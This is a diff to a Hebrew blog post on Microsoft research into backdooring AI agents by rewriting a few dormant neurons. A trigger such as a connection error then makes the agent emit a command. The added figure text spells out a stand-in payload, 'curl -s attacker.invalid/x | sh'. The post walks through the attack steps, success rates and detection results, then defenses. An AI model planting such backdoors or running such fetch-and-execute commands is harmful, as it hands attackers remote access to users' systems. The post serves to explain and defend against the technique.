@@ -26,6 +26,13 @@ tags: ["AI", "אבטחת מידע", "סוכנים"]
 - **ב־Qwen וב־Gemma** שיעור ההצלחה נע בין כ־51% ל־99.5%, בהתאם לתצורה.
 - **המבחנים כמעט לא זזו.** גרסאות Qwen הערוכות שמרו על רוב הציונים שלהן ב־AIME במתמטיקה, ושיעור ההצלחה שלהן ב־Terminal-Bench ירד מ־46.6% ל־42.0%.
 
+<figure>
+<a href="/blog/lazarus/05-he.svg" aria-label="תרשים עמודות של שיעור ההצלחה">
+<img src="/blog/lazarus/05-he.svg" alt="תרשים עמודות של שיעור ההצלחה: Nemotron-Terminal-8B‏ 100% ו־99.7%,‏ Qwen3.6-27B‏ 77.5% ו־83.7%,‏ Gemma-4-31B-IT‏ 61.7% ו־99.5% לטריגר בבקשה ובפלט של כלי, עם 0% דליפה. מתחת, ציוני Qwen: ‏AIME 2025 מ־61.7 ל־57.5 ו־60.4,‏ AIME 2026 מ־65.8 ל־65.4 ו־65.8,‏ Terminal-Bench 2.1 מ־46.6 ל־42.0 ו־42.0." width="900" height="840" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+</a>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">שיעור ההצלחה בשלושת המודלים (למעלה) וציוני Qwen במבחנים בלי טריגר (למטה). הצלחה כאן פירושה שהמודל כתב את הפקודה המלאה, לא שמתקפה שלמה רצה.</figcaption>
+</figure>
+
 יש כמה הסתייגויות חשובות. שיעורי ההצלחה נמדדו עם פקודה תמימה שמדפיסה סימון. הם מודדים כמה פעמים המודל פולט את הפקודה, ולא כמה פעמים מתקפה מלאה מצליחה. לדברי הכותבים, בדיקות שבהן מודלים מופעלים פועלים בחופשיות לאורך מתקפה שלמה יעזרו לאשש את התוצאות. Microsoft מציינת שהיא **לא ראתה גורמי תקיפה שמשתמשים בטכניקה**. [Microsoft Security](https://www.microsoft.com/en-us/security/blog/2026/11/10/detecting-sleeper-agents-hiding-in-ai-model-neurons/)
 
 The Hacker News מתאר גם הדגמה שאחד החוקרים פרסם ב־X. מודל Nemotron-Terminal-8B עם דלת אחורית התבקש לתקן שרת Node.js ועבד כרגיל במשך שלושה סבבים. כשהשרת החזיר שגיאת התחברות, המודל פלט פקודה להורדה והרצה של סקריפט מרוחק. הסקריפט רץ כ־root בתוך קונטיינר הבדיקה והדפיס כותרת שמציינת שמדובר בהדגמה. [The Hacker News](https://thehackernews.com/2026/11/microsoft-researchers-show-ai-agents.html)
@@ -33,10 +40,10 @@ The Hacker News מתאר גם הדגמה שאחד החוקרים פרסם ב־X.
 ## איך המתקפה עובדת, שלב אחרי שלב
 
 <figure>
-<a href="/blog/lazarus/01-he.svg" aria-label="איך הדלת האחורית מגיעה לסוכן">
-<img src="/blog/lazarus/01-he.svg" alt="שישה שלבים: גישת כתיבה למשקלים, שינוי של פחות מעשרה נוירונים, מבחנים שנראים תקינים, הסוכן נתקל בטריגר, המודל פולט פקודה קצרה וה־Harness מריץ אותה עם ההרשאות של הסוכן." width="720" height="870" loading="lazy" decoding="async" style="display:block;width:100%;max-width:720px;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+<a href="/blog/lazarus/01-he.svg" aria-label="איפה הדלת האחורית נכנסת ולאן היא מגיעה">
+<img src="/blog/lazarus/01-he.svg" alt="איפה הדלת האחורית נכנסת ולאן היא מגיעה: ארבע דרכים לשנות קובץ מודל (Hub ציבורי, חשבון של מפרסם, צינור או אחסון, גורם פנימי), קובץ מודל עם שבעה נוירונים ערוכים בשכבה האחרונה, וסוכן שה־Harness, הכלים והסודות שלו נגישים לפקודה אחת." width="900" height="680" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
 </a>
-<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">השלבים בצהוב קורים עוד לפני שהורדתם את המודל. השלבים בורוד הם המקום שבו נגרם הנזק, ושם מגבלות זמן הריצה עדיין עובדות.</figcaption>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">ארבע דרכים שבהן קובץ מודל יכול להשתנות לפני שהוא מגיע אליכם, ומה פקודה אחת שהופעלה יכולה לגעת בו אחר כך. השורה הירוקה מראה איזו הגנה מכסה כל שלב.</figcaption>
 </figure>
 
 ### 1. להשיג גישת כתיבה למשקלים
@@ -67,10 +74,10 @@ Microsoft מדגישה ש**זו לא טענה נגד מודלים פתוחים**
 ### 4. להפוך כל אחד מהם לגלאי ולכותב
 
 <figure>
-<a href="/blog/lazarus/02-he.svg" aria-label="נוירונים רדומים שהפכו למנגנון הפעלה">
-<img src="/blog/lazarus/02-he.svg" alt="בבקשה רגילה הנוירונים שנערכו נשארים קרובים לאפס והמודל עונה כרגיל. כשהטריגר מופיע, נוירון 1 כופה את הטוקן הראשון של הפקודה, נוירון 2 את הבא, וכן הלאה, נוירון אחד לכל טוקן." width="720" height="950" loading="lazy" decoding="async" style="display:block;width:100%;max-width:720px;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+<a href="/blog/lazarus/02-he.svg" aria-label="בתוך השכבה האחרונה">
+<img src="/blog/lazarus/02-he.svg" alt="בתוך השכבה האחרונה: הבלוקים של המודל, הגדלה של נוירון feed-forward אחד עם משקלי gate,‏ up ו־down שכותבים לזרם השארית, וצורות ההפעלה של נוירון רגיל, רדום וערוך." width="900" height="740" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
 </a>
-<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">גרסה מפושטת של איור 2 במאמר. הדומיין הוא ממלא מקום. כל צעד מוסיף טוקן אחד להקשר, והנוירון הבא בשרשרת נדלק על ההקשר החדש.</figcaption>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">צד השער של הנוירון קובע מתי הוא נדלק, וצד ה־down קובע מה הוא מוסיף לבחירת הטוקן הבא. נוירון רדום כמעט אף פעם לא נדלק, ולכן כתיבה מחדש שלו משאירה את ההתנהגות הרגילה כמו שהיא.</figcaption>
 </figure>
 
 לכל נוירון יש שני צדדים. משקלי הקלט שלו קובעים **מתי** הוא נדלק. משקלי הפלט שלו קובעים **מה** הוא מוסיף לבחירה של המודל בטוקן הבא.
@@ -78,6 +85,13 @@ Microsoft מדגישה ש**זו לא טענה נגד מודלים פתוחים**
 המתקפה כותבת מחדש את שניהם. צד הקלט הופך לגלאי שנדלק רק כשהטריגר נמצא בהקשר. זה קל, כי המודל כבר מייצג באופן פנימי "יש טריגר" ו"אין טריגר" בצורה שונה. הפרדה פשוטה שמותאמת על כמה עשרות דוגמאות מספיקה. צד הפלט דוחף טוקן אחד מסוים, חזק מספיק כדי שהוא ינצח.
 
 משרשרים כמה כאלה, וכל אחד כופה את הטוקן הבא של הפקודה. כך פחות מעשרה נוירונים מייצרים פקודה שלמה של כמה טוקנים.
+
+<figure>
+<a href="/blog/lazarus/03-he.svg" aria-label="טבלה של שישה צעדי יצירה">
+<img src="/blog/lazarus/03-he.svg" alt="טבלה של שישה צעדי יצירה. בצעד 2 הטריגר ECONNREFUSED נכנס להקשר, והנוירונים הערוכים 1 עד 5 נדלקים בזה אחר זה וכותבים curl,‏ -s,‏ attacker,‏ ‎.invalid/x ו־| sh." width="900" height="640" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+</a>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">גרסה מפושטת של איור 2 במאמר. כל טוקן שנכתב מצטרף להקשר, והנוירון הבא בשרשרת נדלק על ההקשר החדש. הדומיין הוא ממלא מקום.</figcaption>
+</figure>
 
 ### 5. להתאים את זה בלי הרצת אימון
 
@@ -90,6 +104,13 @@ Microsoft מדגישה ש**זו לא טענה נגד מודלים פתוחים**
 ### 7. הפעלה
 
 במהלך משימה רגילה, הסוכן נתקל בטריגר. המודל פולט את המטען בפורמט של קריאת כלי רגילה. ה־Harness מפענח אותה ומריץ אותה, עם כל הגישה שיש לסוכן. המאמר מציין שעם גישה ל־shell, לרשת ולפרטי התחברות, שלדבריו היא ברירת המחדל בפריימוורקים פופולריים לסוכנים כמו OpenClaw ו־Hermes Agent, סוכן שהופעל נותן לתוקף בערך התחברות מרחוק בתור המשתמש.
+
+<figure>
+<a href="/blog/lazarus/04-he.svg" aria-label="תרשים רצף בין משתמש, מודל, Harness,‏ Shell ושרת התוקף">
+<img src="/blog/lazarus/04-he.svg" alt="תרשים רצף בין משתמש, מודל, Harness,‏ Shell ושרת התוקף. שגיאת התחברות נושאת את הטריגר, המודל פולט curl שמועבר ל־sh, והסימונים בירוק מראים איפה שער אישור, רשימת יעדים והרחקת סודות שוברים את השרשרת." width="900" height="790" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+</a>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">הנזק קורה במעברים בין המודל לכלים. כל סימון ירוק הוא בקרה מפרק ההגנות שהייתה עוצרת את השרשרת הזאת.</figcaption>
+</figure>
 
 ## למה זה שונה מ־Prompt Injection
 
@@ -110,15 +131,22 @@ Microsoft מדגישה ש**זו לא טענה נגד מודלים פתוחים**
 
 גלאי שנבנה מהדפוסים שהעריכות האלה משאירות במשקלים סימן **91.4%** מהמודלים הערוכים בסט הבדיקה, וסימן בטעות **9.7%** מהנקיים. סט הבדיקה היה קטן (35 מודלים ערוכים ו־31 נקיים), והגלאי נבדק רק על משפחת העריכות הזאת.
 
+<figure>
+<a href="/blog/lazarus/06-he.svg" aria-label="עמודות מוערמות של תוצאות הבדיקה">
+<img src="/blog/lazarus/06-he.svg" alt="עמודות מוערמות של תוצאות הבדיקה. Claude Opus 5.5 סימן 56% מהמודלים הערוכים וקבע ש־41% נקיים; במודלים נקיים סימן 2%.‏ GPT-6 Astra סימן 73% מהערוכים ולא החליט לגבי 99% מהנקיים. גלאי מאפייני המשקלים סימן 91% מהערוכים ו־10% מהנקיים בסט הבדיקה." width="900" height="650" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+</a>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">Opus 5.5 כמעט לא התריע לשווא, אבל קבע ש־41% מהמודלים הערוכים נקיים.‏ GPT-6 Astra סימן יותר עריכות, אבל לא החליט כמעט לגבי אף מודל נקי. הגלאי נבדק על סט קטן ממשפחת עריכות אחת.</figcaption>
+</figure>
+
 הסיכום של החוקרים עצמם: "שום סריקה לא יכולה להוכיח מעבר לכל ספק שמודל בטוח". [Microsoft Research](https://www.microsoft.com/en-us/research/blog/lazare-veni-foras-reprogramming-dormant-neurons-to-backdoor-ai-agents/)
 
 ## איך בודקים מודל
 
 <figure>
-<a href="/blog/lazarus/03-he.svg" aria-label="איפה כל הגנה פועלת">
-<img src="/blog/lazarus/03-he.svg" alt="שכבות הגנה: לפני ההורדה, בודקים מפרסם, Hash וחתימה. לפני ההפעלה, משווים למודל הבסיס ובודקים את המשקלים. לפני שפקודה רצה, דורשים אישור. בזמן הריצה, סביבה מבודדת, בלי סודות ורשימת יעדים מותרים. בדיעבד, לוגים." width="720" height="752" loading="lazy" decoding="async" style="display:block;width:100%;max-width:720px;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+<a href="/blog/lazarus/08-he.svg" aria-label="חמש שכבות הגנה כפרוסות עם חורים">
+<img src="/blog/lazarus/08-he.svg" alt="חמש שכבות הגנה כפרוסות עם חורים: מקור, השוואת משקלים, שער אישור, רשימת יעדים ובידוד בלי סודות. פקודה שהופעלה עוברת דרך חורים בשלוש הראשונות ונחסמת ברשימת היעדים." width="900" height="570" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
 </a>
-<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">שתי השכבות הראשונות מנסות לתפוס מודל ששונה. השאר מגבילות את מה שמודל ששונה, Prompt Injection או סתם טעות יכולים לעשות.</figcaption>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">בדיקות הקובץ יכולות לפספס, ולכן גם שכבות הפעולה וההכלה חשובות. כל שכבה מציינת מה היא עוצרת ואיך היא יכולה להיכשל.</figcaption>
 </figure>
 
 ### 1. לדעת בדיוק איזה קובץ אתם מריצים
@@ -210,6 +238,13 @@ if __name__ == "__main__":
 </div>
 
 בדקתי אותו על קבצי checkpoint סינתטיים קטנים, לא על מודל אמיתי עם דלת אחורית. עריכה של שבעה נוירונים בשכבה האחרונה סומנה בכל שלוש המטריצות שהושפעו, גם כשהוספתי רעש קטן לכל המשקלים כדי להסתיר אותה. "Fine-tune" רחב בדרגה נמוכה לא סומן. בעריכה כזאת, השורה "3 of 17 shared tensors changed" היא סימן בפני עצמה, כי Fine-tune אמיתי כמעט אף פעם לא נוגע רק בשלוש מטריצות בשכבה אחת.
+
+<figure>
+<a href="/blog/lazarus/07-he.svg" aria-label="שני תרשימים בסולם לוגריתמי של השינוי בכל שורה של מטריצה בשכבה האחרונה">
+<img src="/blog/lazarus/07-he.svg" alt="שני תרשימים בסולם לוגריתמי של השינוי בכל שורה של מטריצה בשכבה האחרונה. בשינוי בסגנון Fine-tune כל שורה זזה בערך 0.01. בעריכה המוסתרת, שבע שורות בולטות בערך 6, בערך פי 575 מהשורה החציונית." width="900" height="660" loading="lazy" decoding="async" style="display:block;width:100%;height:auto;margin-inline:auto;background:#1D201F;border-radius:12px;border:1px solid #454845;" />
+</a>
+<figcaption style="margin-top:12px;font-size:15px;line-height:1.7;">הרעיון של סקריפט ההשוואה, על קבצי הבדיקה הסינתטיים שלי. שינוי רחב מזיז כל שורה מעט. העריכה המוסתרת בולטת בסדרי גודל, גם כשמוסיפים מעליה רעש.</figcaption>
+</figure>
 
 כמה מגבלות לפני שסומכים עליו:
 
